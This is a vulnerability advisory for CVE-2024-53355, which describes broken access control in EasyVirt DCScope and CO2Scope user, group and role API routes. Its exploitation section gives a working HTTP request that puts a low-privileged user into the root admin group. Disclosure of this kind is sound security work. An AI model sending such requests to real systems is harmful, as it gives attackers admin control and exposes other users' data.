# [CVE-2024-53355] - EasyVirt - Broken Access Control
#### Exploit Author: [Aur√©lien BOURDOIS](https://www.linkedin.com/in/aurelien-bourdois)
#### Date: 10-25-2024
#### Vendor: [EasyVirt](https://www.easyvirt.com/)
#### Vulnerable versions: 
- DCScope <= 8.6.0
- CO2Scope <= 1.3.0

## Description:
Multiple incorrect access control in EasyVirt **DCScope <= 8.6.0** and **CO2Scope <= 1.3.0** allows remote authenticated attackers, with low privileges, to (1) add an admin user via the `/api/user/addalias` route; (2) modifiy a user via the `/api/user/updatealias` route; (4) delete users via the `/api/user/delalias` route; (4) get users via the `/api/user/aliases` route; (5) add a root group via the `/api/user/adduser` route; (6) modifiy a group via the `/api/user/updateuser` route; (7) delete a group via the `/api/user/deluser` route; (8) get groups via the `/api/user/users` route; (9) add an admin role via the `/api/user/addrole` route; (10) modifiy a role via the `/api/user/updaterole` route; (11) delete a role via the `/api/user/delrole` route; (12) get roles via the `/api/user/roles` route.

## Exploitation:
Privilege escalation:
```
PUT /api/user/updatealias HTTP/1.1
Host: XX.XX.XX.XX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=utf-8
Authorization: Token eyJhbGciOiJIU[..snip..]
Content-Length: 113
Te: trailers
Connection: close

{"login":"elymaro","password":"GBpkyhfCkZtPX95fFmddzg==","user":"root","is_local":1,"is_ldap":0,"is_openid":0}
```
> The parameter `user` means group. `root` is the default administrator group.
>
> The encrypted password is `Elym@r0`. 

## Impact :
A low-privileged user can modify his own group, change its permissions or create/modify other users, enabling escalation of privileges.
In addition, the user can access other users' data, including e-mails, login names, group and role membership.
